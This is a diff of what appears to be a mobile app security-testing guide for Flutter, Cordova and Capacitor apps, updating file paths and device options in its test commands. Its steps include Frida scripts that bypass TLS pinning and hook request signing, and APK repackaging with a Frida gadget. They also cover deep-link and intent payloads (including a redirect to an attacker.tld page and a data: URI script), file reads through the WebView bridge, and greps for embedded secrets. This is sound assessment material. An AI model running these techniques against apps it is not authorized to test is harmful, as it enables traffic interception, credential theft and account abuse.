 - **Proof:** `pp.txt` lines carrying your target's real hostnames, and `asm/` files naming real package paths
   (`[package:flutter_secure_storage/...]`, `[package:dio/...]`) — then the live validation of any credential
@@ -1517,8 +1585,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   ldr x16, [x16, #0x280]        ; -> pool entry at 0x24280 — look it up in pp.txt
   ```
   ```bash
-  grep -n '0x24280' out_dir/pp.txt
-  grep -nE 'LoadImmediate|#0x[0-9a-f]{2}\b' out_dir/asm/*.txt | head -60
+  grep -n '0x24280' $DEC/blutter/pp.txt
+  grep -nE 'LoadImmediate|#0x[0-9a-f]{2}\b' $DEC/blutter/asm/*.txt | head -60
   ```
   ```python
   raw = [0x82, 0xE4, 0xBA]          # the immediates in constructor order
@@ -1526,7 +1594,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   ```
   ```bash
   # then confirm the derivation chain in the assembly:
-  grep -nE 'fromCharCodes|sha256|utf8|IV_SALT|AES|CBC|PKCS7' out_dir/asm/*.txt out_dir/pp.txt | head
+  grep -nE 'fromCharCodes|sha256|utf8|IV_SALT|AES|CBC|PKCS7' $DEC/blutter/asm/*.txt $DEC/blutter/pp.txt | head
   ```
   Note that Dart `String` objects use 32-bit compressed pointers and a Smi-encoded length field — apply the
   same `>> 1` when reading lengths by hand.
@@ -1553,19 +1621,19 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | flutter, unity, xamarin, native |
 | **Maps to** | MASWE-0004 (CWE-798); MASTG-TOOL-0144 (gitleaks) |
 
-- **Test:** Cross-platform builds bury PEM blobs and HMAC seeds in the native blob. Scan the file statically,
+- **Test:** (Owner of the native-blob PEM/HMAC test; D12-008 is its crypto-chapter duplicate — run it here and record one verdict on both ids.) Cross-platform builds bury PEM blobs and HMAC seeds in the native blob. Scan the file statically,
   and also scan the loaded module at runtime, because some keys are assembled at init and never exist on disk
   as a contiguous string.
 - **How:**
   ```bash
-  strings -n 20 ext/lib/arm64-v8a/libapp.so    | grep -a -n -- '-----BEGIN'
-  strings -n 20 ext/lib/arm64-v8a/libil2cpp.so | grep -a -n -- '-----BEGIN'
-  grep -a -n -- '-----BEGIN' out_dir/pp.txt
-  grep -rna -- '-----BEGIN' out/assemblies/out/*.dll
+  strings -n 20 $DEC/raw/lib/arm64-v8a/libapp.so    | grep -a -n -- '-----BEGIN'
+  strings -n 20 $DEC/raw/lib/arm64-v8a/libil2cpp.so | grep -a -n -- '-----BEGIN'
+  grep -a -n -- '-----BEGIN' $DEC/blutter/pp.txt
+  grep -rna -- '-----BEGIN' "$DEC/assemblies/out/"*.dll
   ```
   ```javascript
   // runtime module scan — catches keys assembled at init
-  // frida -D "$SERIAL" -f <pkg> -q -e "$(cat scan.js)"
+  // frida -D "$SERIAL" -f <pkg> -l scan.js -q -t 60     (-q without -t detaches right after load: zero hits)
   var m = Process.getModuleByName('libapp.so');
   Memory.scan(m.base, m.size, '2d 2d 2d 2d 2d 42 45 47 49 4e', {     // "-----BEGIN"
     onMatch: function (a) { console.log(a, Memory.readUtf8String(a, 64)); }, onComplete: function () {} });
@@ -1588,7 +1656,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) once forgery unlocks the API; `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (null) for the signature scheme itself |
+| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) once forgery unlocks the API; `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) for the signature scheme itself |
 | **Attacker** | AM-01 |
 | **Applies to** | Flutter release builds that sign requests |
 | **Requires** | flutter, native, device, frida |
@@ -1599,15 +1667,15 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   removes the app from the attack entirely.
 - **How:**
   ```bash
-  python3 blutter.py ext/lib/arm64-v8a out_dir
-  grep -nE 'nonce=|&timestamp=|&method=|&url=|Signature|sign\(' out_dir/pp.txt out_dir/asm/*.txt | head
-  frida -D "$SERIAL" -f <pkg> -l out_dir/blutter_frida.js
+  python3 blutter.py "$DEC/raw/lib/arm64-v8a" "$DEC/blutter"
+  grep -nE 'nonce=|&timestamp=|&method=|&url=|Signature|sign\(' $DEC/blutter/pp.txt $DEC/blutter/asm/*.txt | head
+  frida -D "$SERIAL" -f <pkg> -l $DEC/blutter/blutter_frida.js -q -t 120
   ```
   ```javascript
   // x27 is the Dart object-pool pointer; pool-relative loads look like
   //   add x16, x27, #0x24, lsl #12 ; ldr x16, [x16, #0x280]
   const base = Module.getBaseAddress('libapp.so');
-  Interceptor.attach(base.add(0xa30cfc), {              // address from out_dir/asm/
+  Interceptor.attach(base.add(0xa30cfc), {              // address from $DEC/blutter/asm/
     onEnter (a) { this.inSign = true; },
     onLeave (r) { this.inSign = false; console.log('sig ->', getDartString(r)); }
   });
@@ -1644,24 +1712,24 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:** In escalating order.
   ```bash
   # 0. confirm the diagnosis
-  unzip -l target.apk | grep -E 'libflutter\.so|libapp\.so'
+  grep -E 'libflutter\.so|libapp\.so' "$E/logs/D19-001-apklist.txt"
   # objection: expect no "Found ..." lines and traffic still failing
   objection -g <pkg> explore -s 'android sslpinning disable'
   # 1. transparent redirect — the system proxy is ignored, so redirect at L3
-  adb shell su -c 'iptables -t nat -A OUTPUT -p tcp --dport 80  -j DNAT --to-destination <PROXY-IP>:8080'
-  adb shell su -c 'iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination <PROXY-IP>:8080'
+  adb -s "$SERIAL" shell su -c 'iptables -t nat -A OUTPUT -p tcp --dport 80  -j DNAT --to-destination <PROXY-IP>:8080'
+  adb -s "$SERIAL" shell su -c 'iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination <PROXY-IP>:8080'
   # (or ProxyDroid / a VPN / an AP you control)
   # 2. Frida, pattern-matched hook of ssl_verify_peer_cert (handshake.cc)
-  frida -D "$SERIAL" -f <pkg> -l disable-flutter-tls.js
-  frida -D "$SERIAL" --codeshare TheDauntless/disable-flutter-tls-v1 -f <pkg>
+  frida -D "$SERIAL" -f <pkg> -l disable-flutter-tls.js -q -t 120
+  frida -D "$SERIAL" --codeshare TheDauntless/disable-flutter-tls-v1 -f <pkg> -q -t 120
   # 3. engine patch — no root, no user CA
-  pip3 install reflutter && reflutter target.apk        # choose "Traffic monitoring and interception",
+  pip3 install reflutter && reflutter "$E"/apk/base.apk        # choose "Traffic monitoring and interception",
                                                         # enter your Burp IP -> release.RE.apk
   java -jar uber-apk-signer.jar -a release.RE.apk --out demo-signed
-  adb install demo-signed/release.RE-aligned-debugSigned.apk
+  adb -s "$SERIAL" install demo-signed/release.RE-aligned-debugSigned.apk
   # Burp: add a listener on 8083 (reFlutter) or 8080, bind to all interfaces, enable invisible proxying
   # 4. plugin-level pinning is a separate, Java-side check:
-  grep -rn 'diefferson.http_certificate_pinning.HttpCertificatePinning' out/sources
+  grep -rn 'diefferson.http_certificate_pinning.HttpCertificatePinning' $DEC/jadx/sources
   ```
   ```javascript
   function hook_ssl_verify_peer_cert (address) {
@@ -1676,8 +1744,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   When every BoringSSL symbol is stripped (only GPU exports such as `eglGetDisplay`, `glTexImage2D` remain)
   pattern matching fails — do not stop, move the interception point above TLS:
   ```bash
-  nm -D ext/lib/arm64-v8a/libflutter.so | wc -l
-  nm -D ext/lib/arm64-v8a/libflutter.so | grep -i ssl     # empty => stripped/static
+  nm -D $DEC/raw/lib/arm64-v8a/libflutter.so | wc -l
+  nm -D $DEC/raw/lib/arm64-v8a/libflutter.so | grep -i ssl     # empty => stripped/static
   ```
   ```javascript
   ['send','sendto','sendmsg','write','writev'].forEach(function (fn) {
@@ -1716,10 +1784,10 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   usually assumes the Dart caller is trustworthy.
 - **How:**
   ```bash
-  jadx -r target.apk -d jadx-out
-  grep -rn 'MethodChannel\|EventChannel\|BasicMessageChannel\|setMethodCallHandler\|invokeMethod\|plugins\.flutter\.io' jadx-out/sources | head -60
-  grep -anE 'plugins\.flutter\.io|dev\.flutter|MethodChannel' out_dir/pp.txt | sort -u | head -40
-  grep -rn 'onGenerateRoute\|GoRouter\|routeInformationParser' out_dir/asm/ | head
+  # decompiled by P2 into $DEC/jadx/sources
+  grep -rn 'MethodChannel\|EventChannel\|BasicMessageChannel\|setMethodCallHandler\|invokeMethod\|plugins\.flutter\.io' $DEC/jadx/sources | head -60
+  grep -anE 'plugins\.flutter\.io|dev\.flutter|MethodChannel' $DEC/blutter/pp.txt | sort -u | head -40
+  grep -rn 'onGenerateRoute\|GoRouter\|routeInformationParser' $DEC/blutter/asm/ | head
   ```
   ```javascript
   // runtime enumeration + argument capture
@@ -1749,25 +1817,25 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what the route exposes) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies — rated on what the route exposes) |
 | **Attacker** | AM-02 remote one-click |
 | **Applies to** | Flutter v2 embedding (**CURRENT**). Older v1 embedding required explicit Java plumbing — treat a v1 app as a separate manual review |
 | **Requires** | flutter, deeplink |
 | **Maps to** | Flutter `FlutterActivityLaunchConfigs.java` `HANDLE_DEEPLINKING_META_DATA_KEY = "flutter_deeplinking_enabled"` with documented default `true`; MASTG-TECH-0172, MASTG-TECH-0173, MASTG-TECH-0174 |
 
-- **Test:** `FlutterActivityLaunchConfigs.deepLinkEnabled(metaData)` returns **true** when the key is missing.
+- **Test:** (Owner of the Flutter deep-linking-default test; D09-009 is its deep-link-chapter duplicate — run it here and record one verdict on both ids.) `FlutterActivityLaunchConfigs.deepLinkEnabled(metaData)` returns **true** when the key is missing.
   A Flutter activity with an `ACTION_VIEW`/`BROWSABLE` filter therefore hands the incoming URI straight to the
   Dart router by default, with no Java-side allow-listing. Testers who look only for Java `getData()` handling
   find nothing and wrongly close the deep-link surface.
 - **How:**
   ```bash
-  grep -n 'flutter_deeplinking_enabled' out/AndroidManifest.xml || echo "ABSENT -> deep linking is ENABLED"
-  grep -B3 -A20 'android.intent.action.VIEW' out/AndroidManifest.xml
+  grep -n 'flutter_deeplinking_enabled' $DEC/apktool/AndroidManifest.xml || echo "ABSENT -> deep linking is ENABLED"
+  grep -B3 -A20 'android.intent.action.VIEW' $DEC/apktool/AndroidManifest.xml
   # harvest candidate routes first (D19-033 / D19-035), then drive them:
-  grep -aoE '"/[a-zA-Z0-9_/-]+"' out_dir/pp.txt | sort -u | head -50
-  adb shell am start -a android.intent.action.VIEW -d "myapp://admin/debug" <pkg>
-  adb shell am start -a android.intent.action.VIEW -d "https://app.target.com/internal/tools" <pkg>
-  frida -D "$SERIAL" -f <pkg> -l deeplink-monitor.js
+  grep -aoE '"/[a-zA-Z0-9_/-]+"' $DEC/blutter/pp.txt | sort -u | head -50
+  adb -s "$SERIAL" shell am start -a android.intent.action.VIEW -d "myapp://admin/debug" <pkg>
+  adb -s "$SERIAL" shell am start -a android.intent.action.VIEW -d "https://app.target.com/internal/tools" <pkg>
+  frida -D "$SERIAL" -f <pkg> -l deeplink-monitor.js -q -t 120
   ```
 - **Proof:** The URI path rendering as a Dart route — visible on screen and observable in a Frida hook on the
   router Blutter recovered — with the decompiled `MainActivity` containing no validation at all.
@@ -1782,7 +1850,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) upward when the route renders another user's data |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies — rated on what it exposes); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) upward when the route renders another user's data |
 | **Attacker** | AM-03 zero-permission local app (a twenty-line unprivileged PoC app is sufficient) |
 | **Applies to** | Flutter apps using `io.flutter.embedding.android.FlutterActivity` (v2 embedding), all current versions |
 | **Requires** | flutter, exported-activity |
@@ -1795,14 +1863,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   exported by default, so `android:exported="true"` may never appear.
 - **How:**
   ```bash
-  grep -B5 -A15 'io.flutter.embedding.android.FlutterActivity' out/AndroidManifest.xml
-  adb shell dumpsys package <pkg> | sed -n '/Activity Resolver Table/,/Service Resolver/p'
-  grep -aoE '"/[a-zA-Z0-9_/-]+"' out_dir/pp.txt | sort -u | head -50
-  adb shell am start -n <pkg>/<pkg>.MainActivity -e route "/settings/developer"
-  adb shell am start -n <pkg>/<pkg>.MainActivity -e route "/account/transfer?to=attacker"
-  adb shell am start -n <pkg>/<pkg>.MainActivity -e dart_entrypoint "debugMain"
-  adb shell am start -n <pkg>/<pkg>.MainActivity --esa dart_entrypoint_args "--verbose"
-  adb shell am start -n <pkg>/<pkg>.MainActivity -e cached_engine_id "<id from pp.txt>"
+  grep -B5 -A15 'io.flutter.embedding.android.FlutterActivity' $DEC/apktool/AndroidManifest.xml
+  adb -s "$SERIAL" shell dumpsys package <pkg> | sed -n '/Activity Resolver Table/,/Service Resolver/p'
+  grep -aoE '"/[a-zA-Z0-9_/-]+"' $DEC/blutter/pp.txt | sort -u | head -50
+  adb -s "$SERIAL" shell am start -n <pkg>/<pkg>.MainActivity -e route "/settings/developer"
+  adb -s "$SERIAL" shell am start -n <pkg>/<pkg>.MainActivity -e route "/account/transfer?to=attacker"
+  adb -s "$SERIAL" shell am start -n <pkg>/<pkg>.MainActivity -e dart_entrypoint "debugMain"
+  adb -s "$SERIAL" shell am start -n <pkg>/<pkg>.MainActivity --esa dart_entrypoint_args "--verbose"
+  adb -s "$SERIAL" shell am start -n <pkg>/<pkg>.MainActivity -e cached_engine_id "<id from pp.txt>"
   ```
 - **Proof:** A screen recording of the target screen rendering without passing the app's login or PIN gate,
   from an `am start` issued as shell and then reproduced from an unprivileged third-party app (the `am`
@@ -1818,7 +1886,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 
 | | |
 |---|---|
-| **Severity ceiling** | Low |
+| **Severity ceiling** | Support (P5 resilience on its own; rated by what the substitution unlocks — see Escalation) |
 | **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) — do not file; report what the substitution unlocks |
 | **Attacker** | AM-12 own device — **not an attack** |
 | **Applies to** | Flutter, and any framework with a replaceable engine `.so`; the gadget path also works on non-rooted devices |
@@ -1838,20 +1906,22 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   lib.add_library('libfrida-gadget.so')
   lib.write('lib/arm64-v8a/libflutter.so')
   PY
+  cp "$E"/apk/base.apk repacked.apk            # or the ABI split that carries libflutter.so — a zip of lib/ alone is not an APK
+  zip -d repacked.apk 'META-INF/*'
   cp libfrida-gadget.so libfrida-gadget.config.so lib/arm64-v8a/
-  cat lib/arm64-v8a/libfrida-gadget.config.so
-  # {"interaction":{"type":"listen","address":"0.0.0.0","port":27042,"on_load":"resume"}}
-  zip -r repacked.apk lib/ && zipalign -f 4 repacked.apk aligned.apk
-  java -jar uber-apk-signer.jar --apks aligned.apk
-  adb install -r aligned-signed.apk
-  frida-ps -H 127.0.0.1:27042
-  frida -H 127.0.0.1:27042 -n Gadget -l script.js
+  cat lib/arm64-v8a/libfrida-gadget.config.so  # {"interaction":{"type":"listen","address":"127.0.0.1","port":27042,"on_load":"resume"}}  (loopback, never 0.0.0.0)
+  zip -0 -u repacked.apk lib/arm64-v8a/libflutter.so lib/arm64-v8a/libfrida-gadget.so lib/arm64-v8a/libfrida-gadget.config.so   # -0: stored, required when extractNativeLibs=false (the Play default)
+  zipalign -p -f 4 repacked.apk aligned.apk && java -jar uber-apk-signer.jar --apks aligned.apk
+  adb -s "$SERIAL" install -r aligned-aligned-debugSigned.apk
+  adb -s "$SERIAL" forward tcp:27042 tcp:27042
+  frida-ps -H 127.0.0.1:27042 && frida -H 127.0.0.1:27042 -n Gadget -l script.js -q -t 120
   # separately, the engine-patch path:
-  reflutter target.apk && java -jar uber-apk-signer.jar --apks <patched>.apk && adb install -r <signed>.apk
-  adb logcat | grep -iE 'integrity|tamper|signature|checksum'
+  reflutter "$E"/apk/base.apk && java -jar uber-apk-signer.jar --apks <patched>.apk && adb -s "$SERIAL" install -r <signed>.apk
+  adb -s "$SERIAL" logcat | grep -iE 'integrity|tamper|signature|checksum'
   ```
 - **Proof:** `frida-ps -H 127.0.0.1:27042` listing the Gadget and hooks firing from app start — before any
-  anti-debug initialisation — or the reFlutter build running to completion with no detection, evidenced by a
+  anti-debug initialisation — (`aapt2 dump badging aligned-aligned-debugSigned.apk | grep extractNativeLibs`: with
+  `false`, every `.so` must be stored, `unzip -v aligned-aligned-debugSigned.apk | grep ' Stored '`) — or the reFlutter build running to completion with no detection, evidenced by a
   screen recording plus the intercepted traffic.
 - **Escalation:** On its own this is P5 resilience. It becomes a report through what it defeats: pinning ->
   traffic exposure -> a real D14/D15 finding; or a client-side gate -> D19-074. If the app crashes on start
@@ -1881,7 +1951,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   #   look for app.*.symbols, a SYMBOLS directory, obfuscation-map JSON, or the --split-debug-info output dir
   curl -s -o /dev/null -w '%{http_code}\n' "https://<artifact-host>/<path>/app.android-arm64.symbols"
   # confirm the shipped build is obfuscated in the first place:
-  python3 blutter.py ext/lib/arm64-v8a out_dir && grep -c 'package:' out_dir/pp.txt
+  python3 blutter.py "$DEC/raw/lib/arm64-v8a" "$DEC/blutter" && grep -c 'package:' $DEC/blutter/pp.txt
   ```
 - **Proof:** A publicly reachable symbol map that corresponds to the shipped build, demonstrated by
   symbolising a stack trace from that build.
@@ -1907,8 +1977,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   ```bash
   dart --version; flutter --version              # < 3.11.0 / < 3.41.0 => CVE-2026-27704
   grep -A3 '^  [a-z_]*:' pubspec.lock | grep -E 'name:|version:|url:' | head -60
-  unzip -p target.apk 'assets/flutter_assets/NOTICES*' 2>/dev/null | strings | grep -iE '^[a-z0-9_]+ [0-9]+\.[0-9]+' | head -60
-  strings -a ext/lib/arm64-v8a/libapp.so | grep -aoE 'package:[a-z0-9_]+/' | sort -u | head -60
+  unzip -p "$E"/apk/base.apk 'assets/flutter_assets/NOTICES*' 2>/dev/null | strings | grep -iE '^[a-z0-9_]+ [0-9]+\.[0-9]+' | head -60
+  strings -a $DEC/raw/lib/arm64-v8a/libapp.so | grep -aoE 'package:[a-z0-9_]+/' | sort -u | head -60
   grep -rn "build_runner\|dart:ffi\|DynamicLibrary.open" lib/ pubspec.yaml
   ```
 - **Proof:** For the toolchain, a version below the patched lines on a CI runner that fetches untrusted
@@ -1938,16 +2008,16 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   against it.
 - **How:**
   ```bash
-  apktool d target.apk -o out/
-  ls out/assets/www out/assets/public 2>/dev/null
-  cat out/res/xml/config.xml                    # Cordova
-  cat out/assets/capacitor.config.json          # Capacitor  (CapConfig.loadConfigFromAssets)
-  cat out/assets/capacitor.plugins.json         # Capacitor plugin class list (PluginManager.parsePluginsJSON)
-  cat out/assets/www/cordova_plugins.js         # Cordova plugin -> JS module map
-  ls out/assets/www/plugins/
-  grep -rnoE 'https?://[A-Za-z0-9._/-]+' out/assets/{www,public} 2>/dev/null | sort -u | head -100
-  grep -rniE 'api[_-]?key|secret|token|password|firebase|amazonaws|sentry' out/assets/{www,public} 2>/dev/null
-  find out/assets -name '*.map' -o -name '*.js.map'
+  # decompiled by P2 into $DEC ($DEC/apktool, $DEC/jadx/sources); $DEC/raw holds the unpacked splits
+  ls $DEC/apktool/assets/www $DEC/apktool/assets/public 2>/dev/null
+  cat $DEC/apktool/res/xml/config.xml                    # Cordova
+  cat $DEC/apktool/assets/capacitor.config.json          # Capacitor  (CapConfig.loadConfigFromAssets)
+  cat $DEC/apktool/assets/capacitor.plugins.json         # Capacitor plugin class list (PluginManager.parsePluginsJSON)
+  cat $DEC/apktool/assets/www/cordova_plugins.js         # Cordova plugin -> JS module map
+  ls $DEC/apktool/assets/www/plugins/
+  grep -rnoE 'https?://[A-Za-z0-9._/-]+' $DEC/apktool/assets/{www,public} 2>/dev/null | sort -u | head -100
+  grep -rniE 'api[_-]?key|secret|token|password|firebase|amazonaws|sentry' $DEC/apktool/assets/{www,public} 2>/dev/null
+  find $DEC/apktool/assets -name '*.map' -o -name '*.js.map'
   ```
 - **Proof:** A readable bundle (`main.*.js`, `polyfills.*.js`) plus, in the best case, a shipped `.map` that
   restores original TypeScript with comments and internal endpoint names — and any recovered credential
@@ -1967,20 +2037,22 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Attacker** | AM-02 remote one-click |
 | **Applies to** | Cordova, Ionic-on-Cordova |
 | **Requires** | cordova, webview, js-bridge |
-| **Maps to** | Cordova `WhitelistPlugin.java` — `"*"` on `allow-navigation` expands to `http://*/*`, `https://*/*` **and `data:*`**; `"*"` on `access` expands to `http://*/*` + `https://*/*`; defaults seed `file:///*` and `data:*` into `allowedRequests`. Cordova whitelist docs: "Cannot block redirects from whitelisted remote sites to non-whitelisted destinations"; `allow-navigation` takes precedence over `allow-intent`. MASWE-0035 (CWE-79, CWE-601, CWE-829) |
+| **Maps to** | Cordova `AllowListPlugin.java` (cordova-android ≥ 10; `WhitelistPlugin.java` with `cordova-plugin-whitelist` in cordova-android ≤ 9, **LEGACY**) — `"*"` on `allow-navigation` expands to `http://*/*`, `https://*/*` **and `data:*`**; `"*"` on `access` expands to `http://*/*` + `https://*/*`; defaults seed `file:///*` and `data:*` into `allowedRequests`. Cordova whitelist docs: "Cannot block redirects from whitelisted remote sites to non-whitelisted destinations"; `allow-navigation` takes precedence over `allow-intent`. MASWE-0035 (CWE-79, CWE-601, CWE-829) |
 
 - **Test:** `<allow-navigation href="*">` and `<access origin="*">` are extremely common copy-paste defaults.
   The first lets the WebView top-level navigate anywhere including `data:`; the second lets it fetch anything.
   Neither can stop a redirect chain from an allowed origin to a disallowed one.
 - **How:**
   ```bash
-  grep -nE '<allow-navigation|<allow-intent|<access ' out/res/xml/config.xml
-  grep -n 'Content-Security-Policy' out/assets/www/index.html
+  grep -nE '<allow-navigation|<allow-intent|<access ' $DEC/apktool/res/xml/config.xml
+  grep -n 'Content-Security-Policy' $DEC/apktool/assets/www/index.html
+  grep -rn 'AllowListPlugin\|WhitelistPlugin\|allow-navigation' $DEC/jadx/sources | head          # which allow-list class this build enforces
+  grep -rn 'CordovaWebView.CORDOVA_VERSION\|CORDOVA_VERSION = ' $DEC/jadx/sources | head -1
   # then prove the bridge is reachable from a data: origin:
-  adb shell am start -a android.intent.action.VIEW \
-    -d "data:text/html,<script>alert(typeof _cordovaNative)</script>" <pkg>
+  adb -s "$SERIAL" shell 'am start -a android.intent.action.VIEW -d "data:text/html,%3Cscript%3Ealert(typeof%20_cordovaNative)%3C/script%3E" <pkg>'   # single-quoted + %-encoded: the device sh treats < > as redirections
   # and from a remote origin reached via the app's own redirect handling:
-  adb shell am start -a android.intent.action.VIEW -d "<scheme>://?redirect=https://attacker.tld/x.html" <pkg>
+  adb -s "$SERIAL" shell 'am start -a android.intent.action.VIEW -d "<scheme>://?redirect=https://attacker.tld/x.html" <pkg>'
+  adb -s "$SERIAL" shell dumpsys activity top | grep -m1 -E 'ACTIVITY|intent'    # echo the delivered intent back before reading a negative
   ```
   ```javascript
   // from the attacker page
@@ -2014,11 +2086,11 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   at launch, into the origin that owns the plugin bridge.
 - **How:**
   ```bash
-  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(json.dumps(d,indent=2))" \
+  python3 -c "import json;d=json.load(open('$DEC/apktool/assets/capacitor.config.json'));print(json.dumps(d,indent=2))" \
     | grep -A8 '"server"'
-  grep -n 'content src' out/res/xml/config.xml            # the Cordova equivalent
-  adb logcat -c && adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1
-  adb logcat -d | grep -i capacitor
+  grep -n 'content src' $DEC/apktool/res/xml/config.xml            # the Cordova equivalent
+  adb -s "$SERIAL" logcat -c && adb -s "$SERIAL" shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1
+  adb -s "$SERIAL" logcat -d | grep -i capacitor
   # confirm on the wire:
   tcpdump -i any -n 'tcp port 80 or tcp port 443'
   ```
@@ -2042,12 +2114,12 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | capacitor, webview, js-bridge |
 | **Maps to** | Capacitor `Bridge.java` (`CAPACITOR_FILE_START = "/_capacitor_file_"`, `CAPACITOR_CONTENT_START = "/_capacitor_content_"`, and the injected `window.WEBVIEW_SERVER_URL` global); `AndroidProtocolHandler.openFile()` (`filePath.replace(Bridge.CAPACITOR_FILE_START,"")` -> `new FileInputStream(realPath)`); `AndroidProtocolHandler.openContentUrl()`; `WebViewLocalServer.isLocalFile()`; MASWE-0033 |
 
-- **Test:** Capacitor's local server maps any request whose path starts with `/_capacitor_file_` to
+- **Test:** (Owner of the `/_capacitor_file_` read where the bridge origin is proven here; D10-055 keeps the WebView-configuration angle — cross-reference it, do not re-run it.) Capacitor's local server maps any request whose path starts with `/_capacitor_file_` to
   `new FileInputStream(path)` — the prefix is simply stripped, with **no path containment check**. Any script
   running in the WebView origin can read any file the app's UID can read.
 - **How:** First confirm statically, then exercise it.
   ```bash
-  grep -rn '_capacitor_file_\|_capacitor_content_\|WEBVIEW_SERVER_URL' out/smali* out/sources 2>/dev/null | head
+  grep -rn '_capacitor_file_\|_capacitor_content_\|WEBVIEW_SERVER_URL' $DEC/apktool/smali* $DEC/jadx/sources 2>/dev/null | head
   ```
   ```javascript
   const base = window.WEBVIEW_SERVER_URL;           // injected by Bridge.java as a global
@@ -2121,8 +2193,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   rejected only on the listener path ("Plugin execution is allowed in Main Frame only").
 - **How:**
   ```bash
-  cat out/assets/capacitor.plugins.json
-  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(d.get('android'))"
+  cat $DEC/apktool/assets/capacitor.plugins.json
+  python3 -c "import json;d=json.load(open('$DEC/apktool/assets/capacitor.config.json'));print(d.get('android'))"
   # android.useLegacyBridge true => no origin gate on the bridge
   ```
   ```javascript
@@ -2173,7 +2245,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   prompt('', 'gap_init:');               // returns the secret only from a permitted origin
   ```
   ```bash
-  adb logcat | grep -i "Bridge access attempt with wrong secret token"
+  adb -s "$SERIAL" logcat | grep -i "Bridge access attempt with wrong secret token"
   ```
 - **Proof:** A plugin result returned to your script; or, on a correct implementation, the logcat line
   `Bridge access attempt with wrong secret token, possibly from malicious code. Disabling exec() bridge!` —
@@ -2200,9 +2272,9 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   file and any remote origin, with no CORS.
 - **How:**
   ```bash
-  grep -nE 'AndroidInsecureFileModeEnabled' out/res/xml/config.xml
-  grep -rn 'setAllowUniversalAccessFromFileURLs\|setAllowFileAccessFromFileURLs' out/sources | head
-  grep -nE '<preference name="(scheme|hostname)"' out/res/xml/config.xml
+  grep -nE 'AndroidInsecureFileModeEnabled' $DEC/apktool/res/xml/config.xml
+  grep -rn 'setAllowUniversalAccessFromFileURLs\|setAllowFileAccessFromFileURLs' $DEC/jadx/sources | head
+  grep -nE '<preference name="(scheme|hostname)"' $DEC/apktool/res/xml/config.xml
   ```
   ```javascript
   fetch('file:///data/data/<pkg>/shared_prefs/prefs.xml').then(r => r.text()).then(console.log);
@@ -2221,7 +2293,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | rated by behaviour; `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null) or the sink the plugin reaches |
+| **VRT** | rated by behaviour; `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (varies) or the sink the plugin reaches |
 | **Attacker** | AM-01/AM-03 depending on what the plugin does pre-authentication |
 | **Applies to** | Cordova / Ionic-on-Cordova |
 | **Requires** | cordova, webview, js-bridge, device |
@@ -2232,11 +2304,11 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   surface that a "the user must be logged in" argument does not cover.
 - **How:**
   ```bash
-  grep -n -B3 -A3 'onload' out/res/xml/config.xml
-  grep -rn 'pluginInitialize()' out/sources | head
+  grep -n -B3 -A3 'onload' $DEC/apktool/res/xml/config.xml
+  grep -rn 'pluginInitialize()' $DEC/jadx/sources | head
   # then watch what it does at launch:
-  adb logcat -c && adb shell monkey -p <pkg> 1
-  frida-trace -U -f <pkg> -i 'open*' -i 'connect*' -i 'dlopen*'
+  adb -s "$SERIAL" logcat -c && adb -s "$SERIAL" shell monkey -p <pkg> 1
+  frida-trace -D "$SERIAL" -f <pkg> -i 'open*' -i 'connect*' -i 'dlopen*'
   ```
